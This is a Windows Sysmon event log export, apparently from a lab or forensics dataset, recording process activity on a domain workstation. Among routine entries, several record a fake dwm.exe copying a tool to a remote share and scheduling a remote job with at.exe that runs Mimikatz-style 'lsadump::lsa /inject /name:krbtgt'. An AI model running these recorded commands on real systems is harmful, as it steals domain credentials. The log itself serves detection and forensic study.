情報,2019/11/07 15:35:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:35:25.603
ProcessGuid: {CC41BF7E-542D-5A01-0000-001013362600}
ProcessId: 4884
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:3676 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-542D-5A01-0000-00108C2B2600}
ParentProcessId: 3676
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:35:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:35:25.460
ProcessGuid: {CC41BF7E-542D-5A01-0000-00108C2B2600}
ProcessId: 3676
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:34:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:46.763
ProcessGuid: {CC41BF7E-53C0-5A01-0000-0010BF562300}
ProcessId: 5164
Image: C:\Windows\System32\SearchFilterHost.exe"
情報,2019/11/07 15:34:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:46.763
ProcessGuid: {CC41BF7E-53C0-5A01-0000-0010B3542300}
ProcessId: 3884
Image: C:\Windows\System32\SearchProtocolHost.exe"
情報,2019/11/07 15:34:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:30.481
ProcessGuid: {CC41BF7E-53F5-5A01-0000-00108D0A2600}
ProcessId: 3768
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:34:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:30.481
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ProcessId: 276
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:34:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:30.481
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010FF0C2600}
ProcessId: 2804
Image: C:\Windows\SysWOW64\at.exe"
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:29.746
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:29.746
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:29.745
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010FF0C2600}
ProcessId: 2804
Image: C:\Windows\SysWOW64\at.exe
CommandLine: at.exe  \\win-wfbhibe5gxz 15:37 cmd /c ""C:\Windows\Temp\mz.exe ""privilege::debug"" ""lsadump::lsa /inject /name:krbtgt"" exit > C:\Windows\Temp\o.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DAB503EDF518E58C03827AD4EF312702A0F37398
ParentProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ParentProcessId: 276
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\b.bat"""
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:29.647
ProcessGuid: {CC41BF7E-53F5-5A01-0000-00108D0A2600}
ProcessId: 3768
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ParentProcessId: 276
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\b.bat"""
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:29.630
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ProcessId: 276
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\b.bat""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:34:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:28.106
ProcessGuid: {CC41BF7E-53ED-5A01-0000-00106BD32300}
ProcessId: 5064
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:34:21,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:21.902
ProcessGuid: {CC41BF7E-53ED-5A01-0000-0010CDD02300}
ProcessId: 2240
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:34:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:21.909
ProcessGuid: {CC41BF7E-53ED-5A01-0000-00106BD32300}
ProcessId: 5064
Image: C:\Windows\System32\wermgr.exe
CommandLine: C:\Windows\system32\wermgr.exe -upload
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:34:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:21.877
ProcessGuid: {CC41BF7E-53ED-5A01-0000-0010CDD02300}
ProcessId: 2240
Image: C:\Windows\System32\wermgr.exe
CommandLine: ""C:\Windows\system32\wermgr.exe"" ""-outproc"" ""0"" ""900"" ""9992"" ""8324"" ""11864"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:34:18,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:18.136
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:18,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:18.136
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:34:18,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:18.139
ProcessGuid: {CC41BF7E-53EA-5A01-0000-001002BC2300}
ProcessId: 4852
Image: C:\Windows\System32\svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k wsappx
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0DAC68816AE7C09EFC24D11C27C3274DFD147DEE
ParentProcessGuid: {CC41BF7E-4CCC-5A01-0000-001065750000}
ParentProcessId: 552
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.902
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001024912300}
ProcessId: 5380
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.886
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001008942300}
ProcessId: 204
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.871
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010C0932300}
ProcessId: 5668
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:16.714
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010B89C2300}
ProcessId: 5244
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\Harddisk0\DR0"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:16.699
ProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ProcessId: 900
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:16.683
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010B89C2300}
ProcessId: 5244
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.633
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010B89C2300}
ProcessId: 5244
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=5935A1978B114199079C01D48407894AF30C07DA
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.539
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001008942300}
ProcessId: 204
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-53E8-5A01-0000-0010C0932300}
ParentProcessId: 5668
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.537
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010C0932300}
ProcessId: 5668
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.511
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010658E2300}
ProcessId: 3688
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.511
ProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ProcessId: 5800
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.501
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001024912300}
ProcessId: 5380
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges -Reinvoke
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ParentProcessId: 5800
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.469
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010658E2300}
ProcessId: 3688
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ParentProcessId: 5800
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.465
ProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ProcessId: 5800
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:34:06,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:06.964
ProcessGuid: {CC41BF7E-4CDE-5A01-0000-0010DD2E0200}
ProcessId: 2128
Image: C:\Windows\System32\svchost.exe"
情報,2019/11/07 15:33:57,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:33:57.510
ProcessGuid: {CC41BF7E-53CA-5A01-0000-001079592300}
ProcessId: 4872
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:33:57,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:33:57.463
ProcessGuid: {CC41BF7E-53CA-5A01-0000-001004642300}
ProcessId: 1792
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:33:46,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:33:46.847
ProcessGuid: {CC41BF7E-53CA-5A01-0000-001004642300}
ProcessId: 1792
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:4872 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-53CA-5A01-0000-001079592300}
ParentProcessId: 4872
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:33:46,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:33:46.700
ProcessGuid: {CC41BF7E-53CA-5A01-0000-001079592300}
ProcessId: 4872
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:33:36,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:33:36.126
ProcessGuid: {CC41BF7E-53C0-5A01-0000-0010BF562300}
ProcessId: 5164
Image: C:\Windows\System32\SearchFilterHost.exe
CommandLine: ""C:\Windows\system32\SearchFilterHost.exe"" 0 628 632 640 8192 636 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: Medium
Hashes: SHA1=EB23AC4D23CB9BD84A7D76B091B95785EBE92540
ParentProcessGuid: {CC41BF7E-4CF6-5A01-0000-0010ABA70300}
ParentProcessId: 2736
ParentImage: C:\Windows\System32\SearchIndexer.exe
ParentCommandLine: C:\Windows\system32\SearchIndexer.exe /Embedding"
情報,2019/11/07 15:33:36,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:33:36.103
ProcessGuid: {CC41BF7E-53C0-5A01-0000-0010B3542300}
ProcessId: 3884
Image: C:\Windows\System32\SearchProtocolHost.exe
CommandLine: ""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe5_ Global\UsGthrCtrlFltPipeMssGthrPipe5 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=DE8ADB411330C39BC9E67C1D8E753206E91E31DF
ParentProcessGuid: {CC41BF7E-4CF6-5A01-0000-0010ABA70300}
ParentProcessId: 2736
ParentImage: C:\Windows\System32\SearchIndexer.exe
ParentCommandLine: C:\Windows\system32\SearchIndexer.exe /Embedding"
情報,2019/11/07 15:31:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:31:59.767
ProcessGuid: {CC41BF7E-5353-5A01-0000-00105C172300}
ProcessId: 5240
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:31:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:31:59.720
ProcessGuid: {CC41BF7E-5353-5A01-0000-0010DE212300}
ProcessId: 4644
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:31:47,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:31:47.547
ProcessGuid: {CC41BF7E-5353-5A01-0000-0010DE212300}
ProcessId: 4644
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:5240 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-5353-5A01-0000-00105C172300}
ParentProcessId: 5240
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:31:47,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:31:47.399
ProcessGuid: {CC41BF7E-5353-5A01-0000-00105C172300}
ProcessId: 5240
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:31:17,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:31:17.174
ProcessGuid: {CC41BF7E-5335-5A01-0000-0010DD122300}
ProcessId: 6012
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:31:17,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:31:17.158
ProcessGuid: {CC41BF7E-5335-5A01-0000-00106C122300}
ProcessId: 2200
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:31:17,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:31:17.044
ProcessGuid: {CC41BF7E-5335-5A01-0000-0010DD122300}
ProcessId: 6012
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5335-5A01-0000-00106C122300}
ParentProcessId: 2200
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""copy C:\Intel\Logs\mz.exe J:\Windows\Temp\mz.exe"""
情報,2019/11/07 15:31:17,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:31:17.038
ProcessGuid: {CC41BF7E-5335-5A01-0000-00106C122300}
ProcessId: 2200
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""copy C:\Intel\Logs\mz.exe J:\Windows\Temp\mz.exe""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:31:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:31:02.188
ProcessGuid: {CC41BF7E-5326-5A01-0000-0010CC0C2300}
ProcessId: 4152
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:31:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:31:02.188
